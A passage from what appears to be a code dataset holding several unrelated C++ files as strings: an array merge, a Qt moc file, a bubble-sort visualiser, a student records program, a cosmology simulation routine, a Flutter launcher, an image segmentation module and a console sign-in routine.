continues until end of first number list has been reached\n    while (indexOne < p_lengthOne && indexTwo < p_lengthTwo) {\n        if (p_numbersOne.at(indexOne) > p_numbersTwo.at(indexTwo)) {\n            // shifts every number in the first list of numbers across by one\n            for (size_t swapIndex = p_lengthOne; swapIndex > indexOne; swapIndex--) {\n                p_numbersOne.at(swapIndex) = p_numbersOne.at(swapIndex - 1);\n                p_numbersOne.at(swapIndex - 1) = 0;\n            }\n            p_lengthOne++;\n            \n            // inserts current number in second list of numbers into current position in first list of numbers\n            p_numbersOne.at(indexOne) = p_numbersTwo.at(indexTwo);\n            indexTwo++;\n        }\n\n        indexOne++;\n    }\n\n    // copies remaining values from second numbers list into the first one\n    for (indexTwo; indexTwo < p_lengthTwo; indexTwo++) {\n        p_numbersOne.at(indexOne) = p_numbersTwo.at(indexTwo);\n        indexOne++;\n    }\n}\n\nint main(void)\n{\n    std::vector<int> numbersOneOne = { 1, 2, 3, 0, 0, 0 };\n    std::vector<int> numbersOneTwo = { 2, 5, 6 };\n\n    merge(numbersOneOne, 3, numbersOneTwo, 3);\n\n    // prints values of first merge\n    for (int number : numbersOneOne) {\n        std::cout << number << \", \";\n    }\n\n    std::cout << \"\\n\";\n\n    std::vector<int> numbersTwoOne = { 1 };\n    std::vector<int> numbersTwoTwo = { };\n\n    merge(numbersTwoOne, 1, numbersTwoTwo, 0);\n\n    // prints values of second merge\n    for (int number : numbersTwoOne) {\n        std::cout << number << \", \";\n    }\n\n    std::cout << \"\\n\";\n\n    std::vector<int> numbersThreeOne = { 0 };\n    std::vector<int> numbersThreeTwo = { 1 };\n\n    merge(numbersThreeOne, 0, numbersThreeTwo, 1);\n\n    // prints values of second merge\n    for (int number : numbersThreeOne) {\n        std::cout << number << \", \";\n    }\n\n    std::cout << \"\\n\";\n}\n",
    "/****************************************************************************\n** Meta object code from reading C++ file 'mainwindow.h'\n**\n** Created by: The Qt Meta Object Compiler version 67 (Qt 5.15.17)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include <memory>\n#include \"../../mainwindow.h\"\n#include <QtCore/qbytearray.h>\n#include <QtCore/qmetatype.h>\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'mainwindow.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 67\n#error \"This file was generated using the moc from 5.15.17. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\nQT_BEGIN_MOC_NAMESPACE\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nstruct qt_meta_stringdata_MainWindow_t {\n    QByteArrayData data[8];\n    char stringdata0[137];\n};\n#define QT_MOC_LITERAL(idx, ofs, len) \\\n    Q_STATIC_BYTE_ARRAY_DATA_HEADER_INITIALIZER_WITH_OFFSET(len, \\\n    qptrdiff(offsetof(qt_meta_stringdata_MainWindow_t, stringdata0) + ofs \\\n        - idx * sizeof(QByteArrayData)) \\\n    )\nstatic const qt_meta_stringdata_MainWindow_t qt_meta_stringdata_MainWindow = {\n    {\nQT_MOC_LITERAL(0, 0, 10), // \"MainWindow\"\nQT_MOC_LITERAL(1, 11, 22), // \"on_loginButton_clicked\"\nQT_MOC_LITERAL(2, 34, 0), // \"\"\nQT_MOC_LITERAL(3, 35, 10), // \"adminLogin\"\nQT_MOC_LITERAL(4, 46, 21), // \"on_homeButton_clicked\"\nQT_MOC_LITERAL(5, 68, 21), // \"on_tripButton_clicked\"\nQT_MOC_LITERAL(6, 90, 21), // \"on_cityButton_clicked\"\nQT_MOC_LITERAL(7, 112, 24) // \"on_accountButton_clicked\"\n\n    },\n    \"MainWindow\\0on_loginButton_clicked\\0\\0\"\n    \"adminLogin\\0on_homeButton_clicked\\0\"\n    \"on_tripButton_clicked\\0on_cityButton_clicked\\0\"\n    \"on_accountButton_clicked\"\n};\n#undef QT_MOC_LITERAL\n\nstatic const uint qt_meta_data_MainWindow[] = {\n\n // content:\n       8,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       6,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       0,       // signalCount\n\n // slots: name, argc, parameters, tag, flags\n       1,    0,   44,    2, 0x08 /* Private */,\n       3,    0,   45,    2, 0x08 /* Private */,\n       4,    0,   46,    2, 0x08 /* Private */,\n       5,    0,   47,    2, 0x08 /* Private */,\n       6,    0,   48,    2, 0x08 /* Private */,\n       7,    0,   49,    2, 0x08 /* Private */,\n\n // slots: parameters\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n\n       0        // eod\n};\n\nvoid MainWindow::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        auto *_t = static_cast<MainWindow *>(_o);\n        (void)_t;\n        switch (_id) {\n        case 0: _t->on_loginButton_clicked(); break;\n        case 1: _t->adminLogin(); break;\n        case 2: _t->on_homeButton_clicked(); break;\n        case 3: _t->on_tripButton_clicked(); break;\n        case 4: _t->on_cityButton_clicked(); break;\n        case 5: _t->on_accountButton_clicked(); break;\n        default: ;\n        }\n    }\n    (void)_a;\n}\n\nQT_INIT_METAOBJECT const QMetaObject MainWindow::staticMetaObject = { {\n    QMetaObject::SuperData::link<QMainWindow::staticMetaObject>(),\n    qt_meta_stringdata_MainWindow.data,\n    qt_meta_data_MainWindow,\n    qt_static_metacall,\n    nullptr,\n    nullptr\n} };\n\n\nconst QMetaObject *MainWindow::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *MainWindow::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_MainWindow.stringdata0))\n        return static_cast<void*>(this);\n    return QMainWindow::qt_metacast(_clname);\n}\n\nint MainWindow::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QMainWindow::qt_metacall(_c, _id, _a);\n    if (_id < 0)\n        return _id;\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        if (_id < 6)\n            qt_static_metacall(this, _c, _id, _a);\n        _id -= 6;\n    } else if (_c == QMetaObject::RegisterMethodArgumentMetaType) {\n        if (_id < 6)\n            *reinterpret_cast<int*>(_a[0]) = -1;\n        _id -= 6;\n    }\n    return _id;\n}\nQT_WARNING_POP\nQT_END_MOC_NAMESPACE\n",
    "\r\n#include \"graphics.h\" \r\n#include <bits/stdc++.h> \r\n\r\nusing namespace std; \r\n\r\n// Initialize the size \r\n// with the total numbers to sorted \r\n// and the gap to be maintained in graph \r\nvector<int> numbers; \r\nint size = 200; \r\nint gap = 4; \r\n\r\n// Function for swapping the lines graphically \r\nvoid swap(int i, int j, int x, int y) \r\n{ \r\n\t// Swapping the first line with the correct line \r\n\t// by making it black again and then draw the pixel \r\n\t// for white color. \r\n\r\n\tsetcolor(GREEN); \r\n\tline(i, size, i, size - x); \r\n\tsetcolor(BLACK); \r\n\tline(i, size, i, size - x); \r\n\tsetcolor(WHITE); \r\n\tline(i, size, i, size - y); \r\n\r\n\t// Swapping the first line with the correct line \r\n\t// by making it black again and then draw the pixel \r\n\t// for white color. \r\n\tsetcolor(GREEN); \r\n\tline(j, size, j, size - y); \r\n\tsetcolor(BLACK); \r\n\tline(j, size, j, size - y); \r\n\tsetcolor(WHITE); \r\n\tline(j, size, j, size - x); \r\n} \r\n\r\n// Bubble sort function \r\nvoid bubbleSort() \r\n{ \r\n\tint temp, i, j; \r\n\r\n\tfor (i = 1; i < size; i++) { \r\n\t\tfor (j = 0; j < size - i; j++) { \r\n\t\t\tif (numbers[j] > numbers[j + 1]) { \r\n\t\t\t\ttemp = numbers[j]; \r\n\t\t\t\tnumbers[j] = numbers[j + 1]; \r\n\t\t\t\tnumbers[j + 1] = temp; \r\n\r\n\t\t\t\t// As we swapped the last two numbers \r\n\t\t\t\t// just swap the lines with the values. \r\n\t\t\t\t// This is function call \r\n\t\t\t\t// for swapping the lines \r\n\t\t\t\tswap(gap * j + 1, \r\n\t\t\t\t\tgap * (j + 1) + 1, \r\n\t\t\t\t\tnumbers[j + 1], \r\n\t\t\t\t\tnumbers[j]); \r\n\t\t\t} \r\n\t\t} \r\n\t} \r\n} \r\n\r\n// Driver program \r\nint main() \r\n{ \r\n\r\n\t// auto detection of screen size \r\n\tint gd = DETECT, gm; \r\n\tint wid1; \r\n\r\n\t// Graph initialization \r\n\tinitgraph(&gd, &gm, NULL); \r\n\r\n\t// setting up window size (gap*size) * (size) \r\n\twid1 = initwindow(gap * size + 1, size + 1); \r\n\tsetcurrentwindow(wid1); \r\n\r\n\t// Initializing the array \r\n\tfor (int i = 1; i <= size; i++) \r\n\t\tnumbers.push_back(i); \r\n\r\n\t// Find a seed and shuffle the array \r\n\t// to make it random. \r\n\t// Here different type of array \r\n\t// can be taken to results \r\n\t// such as nearly sorted, already sorted, \r\n\t// reverse sorted to visualize the result \r\n\tunsigned seed \r\n\t\t= chrono::system_clock::now() \r\n\t\t\t.time_since_epoch() \r\n\t\t\t.count(); \r\n\r\n\tshuffle(numbers.begin(), \r\n\t\t\tnumbers.end(), \r\n\t\t\tdefault_random_engine(seed)); \r\n\r\n\t// Initial plot of numbers in graph taking \r\n\t// the vector position as x-axis and its \r\n\t// corresponding value will be the height of line. \r\n\tfor (int i = 1; i <= gap * size; i += gap) { \r\n\t\tline(i, size, i, (size - numbers[i / gap])); \r\n\t} \r\n\r\n\t// Delay the code \r\n\tdelay(200); \r\n\r\n\t// Call sort \r\n\tbubbleSort(); \r\n\r\n\tfor (int i = 0; i < size; i++) { \r\n\t\tcout << numbers[i] << \" \"; \r\n\t} \r\n\tcout << endl; \r\n\r\n\t// Wait for sometime . \r\n\tdelay(5000); \r\n\r\n\t// Close the graph \r\n\tclosegraph(); \r\n\r\n\treturn 0; \r\n} \r\n",
    "# include <iostream>\t\n# include <fstream>\n# include <string>\nusing namespace std;\n\nvoid Get_Student_Data();\n\nvoid Input_Data();\n\n    //START OF MAIN BODY\n    \nint main()\n{\n   \n   //INTRODUCTION \n   \n   cout<<\"                       &&           &            @               @                            \"<<endl;\n   cout<<\"                      &  &          & &        &    &&&&& &&&&&     &&&&&&  &     &           \"<<endl;\n   cout<<\"                     &    &         & &&      && &  &     &      &  &    &  & &   &           \"<<endl;\n   cout<<\"                    &&&&&&&&   &&&&&& & &    & & &  &&&&& &&&&&  &  &    &  &  &  &           \"<<endl;\n   cout<<\"                   &        &  &    & &  &  &  & &      &     &  &  &    &  &   & &           \"<<endl;\n   cout<<\"                  &          & &&&&&& &    &   & &  &&&&& &&&&&  &  &&&&&&  &    &&           \"<<endl<<endl<<endl; \n   \n   cout<<\"                       &&&&&&&                                                                 \"<<endl;\n   cout<<\"                       &         &    &  &&&&&& &&&&&&&&& &&&&&&&  &         &                 \"<<endl;\n   cout<<\"                       &          &  &   &          &     &        & &     & &                 \"<<endl;\n   cout<<\"                       &&&&&&&      &    &&&&&&     &     &&&&&&&  &  &   &  &                 \"<<endl;\n   cout<<\"                             &     &          &     &     &        &   & &   &                 \"<<endl;\n   cout<<\"                       &&&&&&&    &      &&&&&&     &     &&&&&&&  &    &    &                 \"<<endl<<endl;\n   cout<<\"...............................................................................................\"<<endl;\n   cout<<\"   ........................................................................................    \"<<endl;\n   cout<<\"       ................................................................................        \"<<endl;\n   cout<<\"                                                                                               \"<<endl;\n   cout<<\"                                          PRESENTED BY                                         \"<<endl;\n   cout<<\"                                           Emad Tariq                                          \"<<endl;\n   cout<<\"                                           Ammarah Ali                                         \"<<endl;\n   cout<<\"                                           Ahsan Naeem                                         \"<<endl;\n   cout<<\"                                                                                               \"<<endl;  \n   cout<<\"       ................................................................................        \"<<endl; \n   cout<<\"   ........................................................................................    \"<<endl;\n   cout<<\"...............................................................................................\"<<endl<<endl;  \n    \n   \n   \n    //START OF THE PROGRAM\n\t\n\t//asking username and password for security of the system and data\n\t\n\tstring username=\"bahria22\";\n\t\n\tstring password=\"bimcs\";\n\t\n\tstring input1;\n\t\n\tstring input2;\n\t\n\tcout<<\"ENTER USERNAME AND PASSWORD FOR ACCESSING THE SYSTEM\"<<endl<<endl;\n\t\n\tcout<<\"USERNAME=\";\n\t\n\tcin>>input1;\n\t\n\tcout<<\"PASSWORD=\";\n\t\n\tcin>>input2;\n\t\n\tif(username==input1 && password==input2)\n\t{\n\t\t\t\n\t\t\t//SELECTION OF FUNCTION OR OF TASK WHICH IS GOING TO BE PERFORMED\n\t\t\t\n\tchar select;\n\t\n    string fileName;\n    \n    cout<<endl<<\"PRESS E FOR NEW ADMISSION OR PRESS F FOR VIEWING STUDENT DATA\"<<endl;\n    \n    cin>>select;\n    \n    // USING IF ELSE TO SPECIFY THE CONDITION\n    \n    if(select=='E' || select=='e')\n    {\n         \t\t\n         \t\t\n        Input_Data();  //ffunction calling which is described below and already mentioned above\n   \n\t}\n\t\n\telse if (select=='F' || select=='f')\n\t{\n\t\t\n\t    cout<<\"To Get Info\"<<endl; \n\t\tGet_Student_Data();    // function calling which is described below and already mentioned before main\n\t\t\n\t}\n\t\n    else\n\t{\n    \t\n    \tcout<<\"Please Enter Correct Option..!!\";\n    \t\n\t}\n}\n    else{\n    \t\n    \tcout<<\"INCORRECT CREDINTELS\";\n    \t\n\t}\n\t\nreturn 0;\t\n}\n\n   //END OF MAIN BODY\n   \n   \n   //START OF FIRST FUNCTION\n   \n  \n   //FUNCTION FOR STORING STUDENT DATA\n\nvoid Input_Data()\n{\n\t\n\t//USING ARRAY TO STORE THE DATA OF SPECIFIC AMOUNT OF STUDENTS\n\t\n\tchar student_data[3000];\n\tstring  fileName,temp;\t\n\tgetline(cin,temp);\n\t\n\t//USING FILING TO STORES THAT ARRAY INTO A PARTICULAR FILE\n\t\n    cout<<\".......................\"<<endl;\n   \t\tcout<<\"Enter Student Roll#=\";\n        getline(cin,fileName);\n   ofstream rw(fileName.c_str());           // writes data out to a data file.\n\n    //HERE WE CALLED FILE NAME AS FILENAME.C\n    \n    \n\t//STORING NAME OF STUDENT\n    \n\n\tcout<<\"Enter Student name=\";\n\tcin.getline(student_data, 2000);\n    rw<<\"Name : \"<<student_data<<endl;\n    \n    \n\t//STORING FATHERS NAME OF STUDENT\n    \n    \n\tcout<<\"Enter The father name=\";\n\tcin.getline(student_data, 2000);\n    rw<",
    "#include <complex>\n#include <vector>\n#include <iostream>\n#include <cstring>\n#include <fstream>\n#include <algorithm>\n#include <unistd.h>\n#include \"matlib.h\"\n#include \"struct3D.h\"\n#include \"write3D.h\"\n#include \"Cosmoinput3D.h\"\n#include <cmath>\n#include \"gadget_IC.h\"\n#include <gsl/gsl_integration.h>\n#include <fftw3-mpi.h>\n#include <mpi.h>\n\n\nvoid Timestep_criteria(MPI_Params &mpi, Params &par, Operators &opr, int tn,\n\t\t       gsl_function &dt_KE_integrator, gsl_function &dt_PE_integrator, gsl_function &dt_QI_integrator){\n\n  double dt_KE, dt_PE, dt_QI, maxrho, maxphi, max_dt, error, allmaxrho, allmaxphi;\n  gsl_integration_workspace * w = gsl_integration_workspace_alloc(1000);\n\n//  if (mpi.my_rank==0) std::cout << \"Working on Timestep criteria... \\n\";\n  maxphi = std::abs(*max_element(opr.phi.begin(), opr.phi.end(), [](const double &a, const double &b) { return std::abs(a) < std::abs(b); }));\n  maxrho = pow(abs(*max_element(opr.wfc.begin(), opr.wfc.end(), [](const complex &a, const complex &b) { return abs(a) < abs(b); })),2);\n\n  MPI_Allreduce(&maxphi, &allmaxphi, 1, MPI_DOUBLE, MPI_MAX, MPI_COMM_WORLD);\n  MPI_Allreduce(&maxrho, &allmaxrho, 1, MPI_DOUBLE, MPI_MAX, MPI_COMM_WORLD);\n\n    dt_KE = 4./ (3.*M_PI) * (mfdm/pow(c,2))/hbar * pow(par.dx,2) * pow(par.ai,2);\n  //  dt_KE = 4./ (9.*M_PI) * (mfdm/pow(c,2))/hbar * pow(par.dx,2) * pow(par.ai,2);\n  //  dt_KE = 4. * (mfdm/pow(c,2))/hbar * pow(par.dx,2) * pow(par.ai,2) * 10;\n  //  dt_KE = 4. * (mfdm/pow(c,2))/hbar * pow(par.dx,2) * pow(par.ai,2);\n\n  //  if (mfdm <= 1e-24)   dt_KE = 4. * (mfdm/pow(c,2))/hbar * pow(par.dx,2) * pow(par.ai,2) * 10;\n  dt_PE = 2.*M_PI * hbar/(mfdm/pow(c,2)) / allmaxphi * par.ai;\n  //  dt_PE = 2.*M_PI * hbar/(mfdm/pow(c,2)) / allmaxphi * par.ai /5.;\n\n  dt_QI = 2.*M_PI * hbar/ fabs(g) / allmaxrho * pow(par.ai,3);\n  if (g == 0) dt_QI = 0.0;\n\n  if (mpi.my_rank == 0) std::cout << \" max dt_KE = \" << dt_KE \n  \t\t\t\t  << \" max dt_PE = \" << dt_PE\n  \t\t\t\t  << \" max dt_QI = \" << dt_QI  << \"\\n\";\n\n  // find min dt\n  max_dt = dt_KE;\n  int n = 3;\n  if (max_dt > dt_PE) {\n    max_dt = dt_PE;\n    n = 2;\n  }\n  if ((max_dt > dt_QI) and (g!=0)) {\n    max_dt = dt_QI;\n    n = 4;\n  }\n\n  // compute a_next\n  double H =  H_0 * sqrt(Omega_m0/pow(par.ai,3) + (1.0 - Omega_m0));\n  double da = H * par.ai * max_dt;\n  double a_next = par.ai + da;\n  if (mpi.my_rank == 0 ) std::cout << \"ai = \" << par.ai << \" a_next = \" << a_next <<\" da = \" << da << \" n = \" << n <<\" \";\n  \n  gsl_integration_qags(&dt_KE_integrator, par.ai, par.ai + da, 0, 1e-10, 1000, w, &par.dt_KE, &error); \n  gsl_integration_qags(&dt_PE_integrator, par.ai, par.ai + da, 0, 1e-10, 1000, w, &par.dt_PE, &error); \n  gsl_integration_qags(&dt_QI_integrator, par.ai, par.ai + da, 0, 1e-10, 1000, w, &par.dt_QI, &error); \n  //  gsl_integration_qags(&dt_PE_integrator, par.ai, par.ai + da * 0.5, 0, 1e-10, 1000, w, &par.dt_PE, &error); \n  // gsl_integration_qags(&dt_QI_integrator, par.ai, par.ai + da * 0.5, 0, 1e-10, 1000, w, &par.dt_QI, &error); \n\n  par.ai = a_next;\n\n  // if (mpi.my_rank == 0) std::cout << \" dt_KE = \" << par.dt_KE \n  // \t\t\t\t  << \" dt_PE = \" << par.dt_PE\n  // \t\t\t\t  << \" dt_QI = \" << par.dt_QI << \"\\n\\n\";\n  \n}\n\nvoid poisson(MPI_Params &mpi, Params &par, Operators &opr, fftw_plan phik_fplan, fftw_plan phik_bplan)\n{  \n  int N = opr.size;\n  int iglobal;\n  \n  for (int i=0; i < mpi.local_n0; ++i){\n    for (int j=0; j < N; ++j){\n      for (int k=0; k < N; ++k){\n        opr.phi[k+(2*(N/2+1))*(j+i*N)] = mfdm_solar * (pow(abs(opr.wfc[k+N*(j+i*N)]), 2)) - par.rhoc ; // for poisson solver\n      }}}  \n\n  // // Poisson solver in Fourier method\n\n \n  fftw_execute(phik_fplan);\n\n  for (int i = 0; i < mpi.local_n0; ++i){\n    for (int j = 0; j < N; ++j){\n      for (int k = 0; k < N/2+1; ++k){\n        iglobal = i + mpi.my_rank * mpi.local_n0;\n\n        if (pow(par.kx[iglobal],2)+pow(par.ky[j],2)+pow(par.kz[k],2) == 0){\n          opr.phikk[k+(N/2+1)*(j+i*N)] = complex(0.0,0.0);  \n        }\n        else{\n          opr.phikk[k+(N/2+1)*(j+i*N)] = - 4.0  * M_PI * bigG * opr.phikk[k+(N/2+1)*(j+i*N)]/(pow(par.kx[iglobal],2) + pow(par.ky[j],2) + pow(par.kz[k],2));\n        }\n      }\n    }\n  }\n\n  fftw_execute(phik_bplan);\n\n  for (int i=0; i < mpi.local_n0; ++i){\n    for (int j=0; j < N; ++j){\n      for (int k=0; k < 2*(N/2+1); ++k){\n        if (k < N) opr.phi[k+(2*(N/2+1))*(j+i*N)] *= par.fftnorm;\n        else       opr.phi[k+(2*(N/2+1))*(j+i*N)] = 0.0; // pad zero\n      }}}\n}\n\nvoid Split_op_MPI(MPI_Params &mpi, Params &par, Operators &opr, fftw_plan wfc_fplan, fftw_plan wfc_bplan, fftw_plan phik_fplan, fftw_plan phik_bplan, int tn)\n{ \n  \n  int t0 = time(NULL);\n  int N = opr.size;\n  std::stringstream logtxt;\n  \n  if (mpi.my_rank == 0) std::cout << \" tn = \"<< tn <<\"\\n\";\n\n  for (int i = 0; i < mpi.local_n0; ++i){\n  for (int j = 0; j < N; ++j){    \n  for (int k = 0; k < N; ++k){\n    opr.wfc[k+N*(j+N*i)] *= exp(- 0.5 * ( par.dt_PE * opr.phi[k+(2*(N/2+1))*(j+i*N)] * mfdm/pow(c,2)/hbar + par.dt_QI * g /hbar * pow(abs(opr.wfc[k+N*(j+N*i)]),2)) * com",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"authapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include \"meter_seg.h\"\r\n#include \"gpu.h\"\r\n#include <mutex>\r\n#include <iostream>\r\n\r\n\r\nMeterSegmentation::MeterSegmentation(const char* param, const char* bin)\r\n{\r\n    meterSeg.opt.use_vulkan_compute = false;\r\n    meterSeg.opt.use_bf16_storage = false;\r\n    meterSeg.load_param(param);\r\n    meterSeg.load_model(bin);\r\n}\r\n\r\n\r\nbool MeterSegmentation::run(const cv::Mat& img, ncnn::Mat& res)\r\n{\r\n    if (img.empty())\r\n        return false;\r\n\r\n    // \u9884\u5904\u7406\r\n    ncnn::Mat input = ncnn::Mat::from_pixels(img.data, ncnn::Mat::PIXEL_BGR2RGB, UNET_TARGET_SIZE, UNET_TARGET_SIZE);\r\n    input.substract_mean_normalize(mean, std);\r\n\r\n    ncnn::Extractor ex = meterSeg.create_extractor();\r\n    ex.input(\"images\", input);\r\n    ex.extract(\"output\", res);\r\n\r\n    // Softmax\r\n    Softmax(res);\r\n\r\n    return true;\r\n}\r\n\r\nMeterSegmentation::~MeterSegmentation()\r\n{\r\n    meterSeg.clear();\r\n}\r\n\r\nfloat MeterSegmentation::ResizeImage(const cv::Mat& image, cv::Mat& out_image, const cv::Size& new_shape, const cv::Scalar& color = cv::Scalar(128, 128, 128)) {\r\n    cv::Size shape = image.size();\r\n    float scale = std::min(static_cast<float>(new_shape.height) / shape.height, static_cast<float>(new_shape.width) / shape.width);\r\n\r\n    int new_width = static_cast<int>(shape.width * scale);\r\n    int new_height = static_cast<int>(shape.height * scale);\r\n\r\n    cv::Mat resized_image;\r\n    cv::resize(image, resized_image, cv::Size(new_width, new_height), 0, 0, cv::INTER_CUBIC);\r\n\r\n    out_image = cv::Mat(new_shape, image.type(), color);\r\n    resized_image.copyTo(out_image(cv::Rect((new_shape.width - new_width) / 2, (new_shape.height - new_height) / 2, new_width, new_height)));\r\n\r\n    return scale;\r\n}\r\n\r\n\r\nvoid MeterSegmentation::Softmax(ncnn::Mat& res)\r\n{\r\n    for (int i = 0; i < res.h; i++)\r\n    {\r\n        for (int j = 0; j < res.w; j++)\r\n        {\r\n            float max = -FLT_MAX;\r\n            for (int q = 0; q < res.c; q++)\r\n            {\r\n                max = std::max(max, res.channel(q).row(i)[j]);\r\n            }\r\n\r\n            float sum = 0.0f;\r\n            for (int q = 0; q < res.c; q++)\r\n            {\r\n                res.channel(q).row(i)[j] = exp(res.channel(q).row(i)[j] - max);\r\n                sum += res.channel(q).row(i)[j];\r\n            }\r\n\r\n            for (int q = 0; q < res.c; q++)\r\n            {\r\n                res.channel(q).row(i)[j] /= sum;\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\ninline void random_color(std::vector<std::vector<int>>& color_list, int num)\r\n{\r\n    for (int i = 0; i < num; i++)\r\n    {\r\n        int B = rand() % 255;\r\n        int G = rand() % 255;\r\n        int R = rand() % 255;\r\n        color_list.push_back({ B, G, R });\r\n    }\r\n}\r\n\r\ncv::Mat MeterSegmentation::Visualizer(ncnn::Mat res)\r\n{\r\n    std::vector<std::vector<int>> color_list;\r\n    random_color(color_list, res.c);\r\n    cv::Mat seg_result(res.h, res.w, CV_8UC3);\r\n\r\n    for (int i = 0; i < res.h; i++)\r\n    {\r\n        for (int j = 0; j < res.w; j++)\r\n        {\r\n            float max = res.channel(0)[res.w * i + j];\r\n            int index = 0;\r\n            for (int k = 0; k < res.c; k++)\r\n            {\r\n                if (res.channel(k)[res.w * i + j] > max)\r\n                {\r\n                    index = k;\r\n                    max = res.channel(k)[res.w * i + j];\r\n                }\r\n            }\r\n            seg_result.at<cv::Vec3b>(i, j)[0] = color_list[index][0];  // B\r\n            seg_result.at<cv::Vec3b>(i, j)[1] = color_list[index][1];  // G\r\n            seg_result.at<cv::Vec3b>(i, j)[2] = color_list[index][2];  // R\r\n        }\r\n    }\r\n\r\n    return seg_result;\r\n}\r\n\r\ncv::Mat MeterSegmentation::Process(const cv::Mat& input_image)\r\n{\r\n\r\n    std::cout << \"current image shape: \" << input_image.rows << \", \" << input_image.cols << std::endl;\r\n\r\n#ifdef VISUALIZE\r\n    cv::imshow(\"input_image: \", input_image);\r\n    cv::waitKey(0);\r\n#endif\r\n\r\n    // \u5c06\u56fe\u50cf\u5927\u5c0f\u8c03\u6574\u4e3a\u76ee\u6807\u5927\u5c0f\r\n    cv::Mat resize_image;\r\n    float scale = ResizeImage(input_image, resize_image, cv::Size(UNET_TARGET_SIZE, UNET_TARGET_SIZE), cv::Scalar(128, 128, 128));\r\n    std::cout << \"current scale: \" << scale << std::endl;\r\n\r\n#ifdef VISUALIZE\r\n    cv::imshow(\"resize_image\", resize_image);\r\n    cv::waitKey(0);\r\n#endif\r\n\r\n    // \u8fd0\u884c\u5206\u5272\u6a21\u578b\r\n    ncnn::Mat res;\r\n    run(resize_image, res);\r\n\r\n#ifdef VISUALIZE\r\n    std::cout << \"Res shape: \" << res.h << \", \" << res.w << \", \" << res.c << std::endl;\r\n#endif\r\n\r\n    /*\r\n    // \u4ee3\u7801\u540e\u5904\u7406(\u9488\u5bf9\u4eea\u8868\u68c0\u6d4b\u4efb\u52a1)\r\n    cv::Mat mask = cv::Mat(UNET_TARGET_SIZE, UNET_TARGET_SIZE, CV_8UC1, cv::Scalar(0));\r\n\r\n    const float* class0mask = res.channel(0);  // background\r\n    const float* class1mask = res.channel(1);  // pointer\r\n    const float* class2mask = res.channel(2);  // scale\r\n\r\n    // \u904d\u5386\u6bcf\u4e2a\u50cf\u7d20\uff0c\u786e\u5b9a\u5176\u7c7b\u522b\r\n    for (int i = 0; i < UNET_TARGET_SIZE; i++) {\r\n        for (int j = 0; j < UNET_TARGET_SIZE; j++) {\r\n            int num = i * UNET_TARGET_SIZE + j;\r\n            if ((class1mask[num] > class2mask[num]) && (class1mask[num] > class0mask[num])) {\r\n                mask.at<uchar>(i, j) = 1;\r\n            }\r",
    "#include <iostream>\n#include <string>\n#include <fstream>\n#include \"json.hpp\"\n#include \"signin.hpp\"\nusing json = nlohmann::json;\n\nstd::string SignIn::signin()\n{\n\n  std::ifstream f(\"Drive.json\");\n  json drvDat = json::parse(f);\n  std::string usrNm;\n  std::string inPswd;\n  std::vector<std::string> usrArr = {};\n  std::cout << \"Welcome to \" + (std::string) drvDat[\"osName\"] << \"\\n\";\n  std::cout << \"Please choose a user from the list:\\n\";\n  for (auto& usr : drvDat[\"users\"].items()) {\n    std::cout << \" \" + usr.key() + \"\\n\";\n    usrArr.push_back(usr.key());\n  }\n\n  // username input\n  std::cin >> usrNm;\n    for (int i=0; i<usrArr.size(); i++) {\n      if (usrArr[i] == usrNm){\n        break;\n      }\n      if (i == usrArr.size() -1 and usrArr[i] != usrNm) {\n        std::cout << \"\\033[1;31mNo user called \\\"\" + usrNm + \"\\\". Stopping system\\033[0m\\n\";\n        return \"syssd\";\n      }\n    }\n    std::cout << \"Enter your password, \" + usrNm + \": \\n\";\n    std::cin >> inPswd;\n\n    for (int j=0; j<usrArr.size(); j++) {\n      if (inPswd == drvDat[\"users\"][usrNm][\"password\"]) {\n        std::cout << \"Correct password, Welcome \" + usrNm +\"\\n\";\n        break;\n      } else if (inPswd != drvDat[\"users\"][usrNm][\"password\"]) {\n        std::cout << \"\\033[1;31mPassword incorrect. Stopping system\\n\\033[0m\";\n        return \"syssd\";\n      }\n    }\n  return usrNm;\n}",
